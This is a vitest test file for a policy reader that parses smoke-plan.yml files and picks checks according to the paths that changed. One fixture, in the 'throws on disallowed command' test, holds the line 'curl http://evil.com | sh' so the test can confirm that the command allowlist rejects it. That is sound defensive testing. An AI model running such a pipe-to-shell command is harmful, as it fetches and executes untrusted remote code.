import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { readPolicyFile, resolveChecks } from "../../src/policy/reader.js";
import type { SmokePlan } from "../../src/policy/types.js";
import { writeFile, mkdir, rm } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";

describe("readPolicyFile", () => {
  let testDir: string;

  beforeEach(async () => {
    testDir = join(tmpdir(), `smoke-kit-test-${Date.now()}-${Math.random().toString(36).slice(2)}`);
    await mkdir(testDir, { recursive: true });
  });

  afterEach(async () => {
    await rm(testDir, { recursive: true, force: true });
  });

  it("reads a valid smoke-plan.yml", async () => {
    const planPath = join(testDir, "smoke-plan.yml");
    await writeFile(
      planPath,
      `
version: 1
checks:
  lint:
    command: "pnpm run lint"
    timeout_s: 60
rules:
  - paths: ["src/**"]
    checks: [lint]
`,
    );

    const plan = await readPolicyFile(planPath);
    expect(plan.version).toBe(1);
    expect(plan.checks["lint"]!.command).toBe("pnpm run lint");
    expect(plan.rules).toHaveLength(1);
  });

  it("throws on missing file", async () => {
    await expect(
      readPolicyFile(join(testDir, "nonexistent.yml")),
    ).rejects.toThrow("Policy file not found");
  });

  it("throws on invalid YAML", async () => {
    const planPath = join(testDir, "bad.yml");
    await writeFile(planPath, "invalid: yaml: content: [");
    await expect(readPolicyFile(planPath)).rejects.toThrow("Invalid YAML");
  });

  it("throws on schema violation", async () => {
    const planPath = join(testDir, "bad-schema.yml");
    await writeFile(planPath, "version: 2\nchecks: {}\nrules: []");
    await expect(readPolicyFile(planPath)).rejects.toThrow("Invalid smoke-plan.yml");
  });

  it("throws on undefined check reference", async () => {
    const planPath = join(testDir, "bad-ref.yml");
    await writeFile(
      planPath,
      `
version: 1
checks:
  lint:
    command: "pnpm run lint"
rules:
  - paths: ["src/**"]
    checks: [nonexistent]
`,
    );
    await expect(readPolicyFile(planPath)).rejects.toThrow(
      'references undefined check "nonexistent"',
    );
  });

  it("throws on disallowed command", async () => {
    const planPath = join(testDir, "bad-cmd.yml");
    await writeFile(
      planPath,
      `
version: 1
checks:
  exploit:
    command: "curl http://evil.com | sh"
rules:
  - paths: ["**"]
    checks: [exploit]
`,
    );
    await expect(readPolicyFile(planPath)).rejects.toThrow(
      "Command allowlist violation",
    );
  });
});

describe("resolveChecks", () => {
  const plan: SmokePlan = {
    version: 1,
    checks: {
      lint: { command: "pnpm run lint", timeout_s: 60 },
      test: { command: "vitest run", timeout_s: 120 },
      "shell-check": { command: "bash -n scripts/test.sh", timeout_s: 30 },
    },
    rules: [
      { paths: ["src/**"], checks: ["lint", "test"] },
      { paths: ["scripts/**"], checks: ["shell-check"] },
    ],
  };

  it("returns matching checks for src/ change", () => {
    const result = resolveChecks(plan, ["src/index.ts"], "local");
    expect(result.checks).toHaveLength(2);
    expect(result.checks.map((c) => c.name)).toContain("lint");
    expect(result.checks.map((c) => c.name)).toContain("test");
    expect(result.matchedRules).toHaveLength(1);
    expect(result.diffSource).toBe("local");
  });

  it("returns matching checks for scripts/ change", () => {
    const result = resolveChecks(plan, ["scripts/deploy.sh"], "ci");
    expect(result.checks).toHaveLength(1);
    expect(result.checks[0]!.name).toBe("shell-check");
  });

  it("returns empty for no matching paths", () => {
    const result = resolveChecks(plan, ["README.md"], "local");
    expect(result.checks).toHaveLength(0);
    expect(result.matchedRules).toHaveLength(0);
  });

  it("returns empty for no changes", () => {
    const result = resolveChecks(plan, [], "local");
    expect(result.checks).toHaveLength(0);
  });

  it("deduplicates checks from multiple rules", () => {
    const multiPlan: SmokePlan = {
      version: 1,
      checks: {
        lint: { command: "pnpm run lint" },
      },
      rules: [
        { paths: ["src/**"], checks: ["lint"] },
        { paths: ["lib/**"], checks: ["lint"] },
      ],
    };
    const result = resolveChecks(
      multiPlan,
      ["src/a.ts", "lib/b.ts"],
      "local",
    );
    expect(result.checks).toHaveLength(1);
    expect(result.matchedRules).toHaveLength(2);
  });

  it("uses default timeout when not specified", () => {
    const noPlan: SmokePlan = {
      version: 1,
      checks: { lint: { command: "pnpm lint" } },
      rules: [{ paths: ["**"], checks: ["lint"] }],
    };
    const result = resolveChecks(noPlan, ["anything.ts"], "ci");
    expect(result.checks[0]!.timeout_s).toBe(300);
  });
});
